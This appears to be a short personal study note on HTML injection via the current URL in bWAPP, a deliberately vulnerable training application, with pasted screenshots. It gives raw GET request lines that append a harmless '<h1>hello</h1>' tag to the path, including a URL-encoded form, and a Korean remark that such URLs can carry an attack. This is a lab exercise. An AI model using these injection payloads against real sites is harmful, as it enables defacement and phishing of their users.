![[Pasted image 20241010113246.png]]
![[Pasted image 20241010113325.png]]

```
GET /bWAPP/htmli_current_url.php HTTP/1.1
GET /bWAPP/htmli_current_url.php<h1>hello</h1> HTTP/1.1
```
![[Pasted image 20241010113444.png]]
```
GET /bWAPP/htmli_current_url.php/<h1>hello</h1> HTTP/1.1
```
![[Pasted image 20241010113649.png]]
- URL에도 html 소스를 추가해 공격이 가능하다

`GET /bWAPP/htmli_current_url.php/%3ch1%3ehello%3c%2fh1%3e HTTP/1.1`